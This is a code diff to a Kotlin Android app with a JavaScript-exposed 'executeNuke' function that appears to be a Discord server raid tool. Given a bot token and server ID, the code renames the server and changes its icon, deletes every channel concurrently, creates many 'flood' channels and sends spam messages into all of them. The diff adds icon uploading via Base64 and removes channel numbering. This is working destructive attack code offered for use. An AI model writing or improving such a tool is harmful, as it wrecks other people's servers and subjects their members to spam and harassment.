@@ -4,6 +4,7 @@ import android.annotation.SuppressLint
 import android.content.Context
 import android.net.Uri
 import android.os.Bundle
+import android.util.Base64
 import android.view.View
 import android.webkit.JavascriptInterface
 import android.webkit.WebSettings
@@ -26,6 +27,7 @@ import okhttp3.Request
 import okhttp3.RequestBody
 import org.json.JSONArray
 import org.json.JSONObject
+import java.io.InputStream
 
 class MainActivity : ComponentActivity() {
 
@@ -34,8 +36,9 @@ class MainActivity : ComponentActivity() {
 
     private val pickImageLauncher = registerForActivityResult(ActivityResultContracts.GetContent()) { uri: Uri? ->
         uri?.let {
+            val uriString = it.toString()
             val fileName = it.lastPathSegment ?: "server_icon.png"
-            webView.evaluateJavascript("window.onImageSelected('$fileName')", null)
+            webView.evaluateJavascript("window.onImageUriSelected('$uriString', '$fileName')", null)
             Toast.makeText(this, "Foto seleccionada: $fileName", Toast.LENGTH_SHORT).show()
         }
     }
@@ -91,7 +94,7 @@ class MainActivity : ComponentActivity() {
         }
 
         @JavascriptInterface
-        fun executeNuke(token: String, serverId: String, serverName: String, channelName: String, channelLimit: String, messageContent: String, messageLimit: String, imageName: String) {
+        fun executeNuke(token: String, serverId: String, serverName: String, channelName: String, channelLimit: String, messageContent: String, messageLimit: String, imageUriString: String) {
             CoroutineScope(Dispatchers.IO).launch {
                 try {
                     if (protectedIds.contains(serverId)) {
@@ -111,11 +114,31 @@ class MainActivity : ComponentActivity() {
 
                     logMsg("[BOT] Conectando bot de Discord y verificando servidor ID: $serverId...", "info")
 
-                    // 1. Update Server Name
-                    val patchBody = RequestBody.create(
-                        jsonMediaType,
-                        JSONObject().put("name", serverName).toString()
-                    )
+                    // Convert server icon to Base64 data URI if provided
+                    var iconBase64: String? = null
+                    if (imageUriString.isNotEmpty()) {
+                        try {
+                            val uri = Uri.parse(imageUriString)
+                            val inputStream: InputStream? = activity.contentResolver.openInputStream(uri)
+                            val bytes = inputStream?.readBytes()
+                            inputStream?.close()
+                            if (bytes != null && bytes.isNotEmpty()) {
+                                val encoded = Base64.encodeToString(bytes, Base64.NO_WRAP)
+                                iconBase64 = "data:image/png;base64,$encoded"
+                                logMsg("[+] Imagen de servidor convertida a Base64 correctamente", "success")
+                            }
+                        } catch (e: Exception) {
+                            logMsg("[-] No se pudo procesar la imagen del servidor: ${e.localizedMessage}", "error")
+                        }
+                    }
+
+                    // 1. Update Server Name & Icon
+                    val guildJson = JSONObject().put("name", serverName)
+                    if (iconBase64 != null) {
+                        guildJson.put("icon", iconBase64)
+                    }
+
+                    val patchBody = RequestBody.create(jsonMediaType, guildJson.toString())
                     val patchReq = Request.Builder()
                         .url("https://discord.com/api/v10/guilds/$serverId")
                         .patch(patchBody)
@@ -126,14 +149,14 @@ class MainActivity : ComponentActivity() {
 
                     client.newCall(patchReq).execute().use { resp ->
                         if (resp.isSuccessful) {
-                            logMsg("[+] Nombre del servidor cambiado a: $serverName", "success")
+                            logMsg("[+] Servidor actualizado (Nombre y/o Icono cambiados)", "success")
                         } else {
-                            logMsg("[-] No se pudo cambiar el nombre del servidor (Código: ${resp.code})", "error")
+                            logMsg("[-] No se pudo actualizar el servidor (Código: ${resp.code})", "error")
                         }
                     }
 
-                    // 2. Delete ALL existing channels concurrently (matching asyncio.gather)
-                    logMsg("[*] Eliminando todos los canales existentes concurrentemente...", "info")
+                    // 2. Delete ALL existing channels concurrently
+                    logMsg("[*] Eliminando todos los canales existentes...", "info")
                     val getChannelsReq = Request.Builder()
                         .url("https://discord.com/api/v10/guilds/$serverId/channels")
                         .get()
@@ -167,15 +190,15 @@ class MainActivity : ComponentActivity() {
                         }
                     }
 
-                    // 3. Create all flood channels concurrently (matching asyncio.gather)
-                    logMsg("[*] Creando $limit canales de inundación concurrentemente...", "info")
+                    // 3. Create all flood channels concurrently without 123 numbers
+                    logMsg("[*] Creando $limit canales de inundación...", "info")
                     val createdChannelIds = mutableListOf<String>()
                     val createDeferred = (0 until limit).map { i ->
                         async(Dispatchers.IO) {
                             try {
                                 val chanBody = RequestBody.create(
                                     jsonMediaType,
-                                    JSONObject().put("name", "$channelName-${i + 1}").put("type", 0).toString()
+                                    JSONObject().put("name", channelName).put("type", 0).toString()
                                 )
                                 val chanReq = Request.Builder()
                                     .url("https://discord.com/api/v10/guilds/$serverId/channels")
@@ -194,7 +217,7 @@ class MainActivity : ComponentActivity() {
                                             synchronized(createdChannelIds) {
                                                 createdChannelIds.add(channelId)
                                             }
-                                            logMsg("[+] Canal creado: $channelName-${i + 1}", "success")
+                                            logMsg("[+] Canal creado: $channelName", "success")
                                         }
                                     }
                                 }
@@ -205,8 +228,8 @@ class MainActivity : ComponentActivity() {
                     }
                     createDeferred.awaitAll()
 
-                    // 4. Send spam messages across all channels concurrently with 150ms delay matching asyncio.sleep(0.15)
-                    logMsg("[+] Inyectando mensajes de spam en paralelo...", "info")
+                    // 4. Send spam messages across all channels concurrently with 150ms delay
+                    logMsg("[+] Inyectando mensajes de spam...", "info")
                     val spamDeferred = createdChannelIds.map { channelId ->
                         async(Dispatchers.IO) {
                             for (m in 0 until msgLimit) {
@@ -224,9 +247,9 @@ class MainActivity : ComponentActivity() {
                                         .build()
 
                                     client.newCall(msgReq).execute().close()
-                                    delay(150) // matching asyncio.sleep(0.15)
+                                    delay(150)
                                 } catch (e: Exception) {
-                                    // ignore rate limit or error per message
+                                    // ignore
                                 }
                             }
                         }
